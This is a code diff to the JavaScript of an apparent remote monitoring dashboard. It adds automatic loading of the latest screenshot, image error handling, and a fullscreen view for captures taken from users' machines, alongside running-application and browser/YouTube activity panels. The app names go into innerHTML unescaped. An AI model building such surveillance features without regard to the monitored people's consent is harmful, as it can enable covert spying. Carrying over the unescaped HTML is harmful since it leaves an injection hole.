@@ -182,6 +182,9 @@ function selectUser(user, isOnline) {
     clearLogs();
     log(`Selected user: ${user.name}`);
     loadHistory(user.id);
+
+    // Load latest screenshot automatically
+    loadLatestScreenshot(user.id);
 }
 
 // ------ Live Feed Management ------
@@ -193,38 +196,73 @@ function updateLiveFeed(type, data) {
     const list = document.getElementById('feedList');
     const loading = document.getElementById('feedLoading');
     const titleEl = document.getElementById('liveFeedTitle');
+    const expandBtn = document.getElementById('expandScreenshotBtn');
 
-    // Hide all first
-    placeholder.classList.add('hidden');
-    image.classList.add('hidden');
-    list.classList.add('hidden');
+    if (!container || !placeholder || !image || !list || !loading) {
+        console.error("Critical elements missing for Live Feed updates");
+        return;
+    }
+
+    // Reset visibility (Hide all)
+    placeholder.style.display = 'none';
+    image.style.display = 'none';
+    list.style.display = 'none';
+    loading.style.display = 'none';
+    list.classList.add('hidden'); // Ensure Tailwind class is also handled if used elsewhere
     loading.classList.add('hidden');
+    if (expandBtn) expandBtn.classList.add('hidden'); // Hide expand button by default
 
     if (type === 'reset') {
-        placeholder.classList.remove('hidden');
+        placeholder.style.display = 'block';
         if (titleEl) titleEl.textContent = 'Live Feed';
         return;
     }
 
     if (type === 'loading') {
+        loading.style.display = 'flex';
         loading.classList.remove('hidden');
-        // Keep previous content visible behind loading overlay? Or just show overlay?
-        // Let's keep placeholder visible if nothing else
-        if (image.src === "" && list.innerHTML === "") placeholder.classList.remove('hidden');
+        // Keep placeholder visible behind loading if empty
+        if (!image.src || image.src.endsWith('#') || image.style.display === 'none') {
+            placeholder.style.display = 'block';
+        }
         return;
     }
 
     if (type === 'image') {
+        // Set source
         image.src = data;
-        image.classList.remove('hidden');
+
+        // Error handling for image load
+        image.onerror = function () {
+            log('Error loading image. Check console.', 'error');
+            console.error("Image failed to load:", data);
+            placeholder.style.display = 'block'; // Fallback
+            image.style.display = 'none';
+            if (expandBtn) expandBtn.classList.add('hidden');
+        };
+
+        image.onload = function () {
+            // Only show when loaded
+            image.style.display = 'block';
+            // Show expand button when image is displayed
+            if (expandBtn) expandBtn.classList.remove('hidden');
+        };
+
+        // Force display block immediately too, onload handles final render
+        image.style.display = 'block';
+
         if (titleEl) titleEl.textContent = 'Remote Screen Capture';
+
     } else if (type === 'apps') {
         list.innerHTML = data.map(app => `<div><span class="text-white">[APP]</span> ${app.name || app}</div>`).join('');
+        list.style.display = 'block';
         list.classList.remove('hidden');
         if (titleEl) titleEl.textContent = 'Running Applications';
+
     } else if (type === 'browser') {
         const status = `Browser: ${data.browser} | YouTube: ${data.youtube_open ? 'OPEN' : 'CLOSED'}`;
         list.innerHTML = `<div class="text-lg text-center mt-10">${status}</div>`;
+        list.style.display = 'block';
         list.classList.remove('hidden');
         if (titleEl) titleEl.textContent = 'Browser Activity Monitoring';
     }
@@ -272,12 +310,25 @@ async function pollForCommandResult(commandId, type, userId) {
         }
 
         try {
+            if (attempts % 3 === 0) log(`Polling... (${attempts}/${maxAttempts})`); // Debug log
+
             if (type === 'TAKE_SCREENSHOT') {
                 const res = await api.getScreenshot(commandId);
                 if (res.url) {
                     clearInterval(commandPollInterval);
                     log(`Screenshot received!`, 'success');
-                    updateLiveFeed('image', res.url);
+
+                    // Display in Live Feed Container
+                    // Prefer Base64 (image_data) if available to avoid CORS/Mixed Content issues
+                    let imageUrl;
+                    if (res.image_data) {
+                        imageUrl = res.image_data;
+                    } else {
+                        // Fallback to URL with timestamp
+                        imageUrl = `${res.url}?t=${new Date().getTime()}`;
+                    }
+
+                    updateLiveFeed('image', imageUrl);
 
                     // Also update stats card
                     const countEl = document.getElementById('detailScreenshots');
@@ -314,7 +365,8 @@ async function pollForCommandResult(commandId, type, userId) {
                 }
             }
         } catch (e) {
-            // Ignore errors while polling
+            // Ignore errors while polling, but log fatal ones
+            if (attempts % 5 === 0) log(`Polling error: ${e.message}`, 'warning');
             console.log("Polling error:", e);
         }
 
@@ -399,6 +451,59 @@ function toggleNavDrawer() {
     } else {
         drawer.classList.add('translate-x-full');
         overlay.classList.add('hidden');
+    }
+}
+
+// ------ Latest Screenshot Functions ------
+
+async function loadLatestScreenshot(userId) {
+    if (!userId) return;
+
+    try {
+        const data = await api.getLatestScreenshot(userId);
+
+        // Prefer base64 image_data if available
+        let imageUrl;
+        if (data.image_data) {
+            imageUrl = data.image_data;
+        } else {
+            // Fallback to URL with cache-busting timestamp
+            imageUrl = `${data.url}?t=${new Date().getTime()}`;
+        }
+
+        // Update live feed with the screenshot
+        updateLiveFeed('image', imageUrl);
+
+        log('Latest screenshot loaded', 'success');
+
+    } catch (err) {
+        // No screenshot available - this is normal for new users
+        console.log('No screenshot available:', err.message);
+        // Keep the placeholder visible
+        updateLiveFeed('reset');
+    }
+}
+
+// Expand screenshot to fullscreen
+function expandScreenshot() {
+    const feedImage = document.getElementById('feedImage');
+    const modal = document.getElementById('screenshotModal');
+    const previewImage = document.getElementById('screenshotPreview');
+    const downloadLink = document.getElementById('downloadLink');
+
+    if (!feedImage || !feedImage.src || feedImage.style.display === 'none') {
+        console.log('No screenshot to expand');
+        return;
+    }
+
+    // Set the modal image to the current feed image
+    if (previewImage) previewImage.src = feedImage.src;
+    if (downloadLink) downloadLink.href = feedImage.src;
+
+    // Show modal
+    if (modal) {
+        modal.classList.remove('hidden');
+        log('Screenshot expanded to fullscreen', 'info');
     }
 }
 
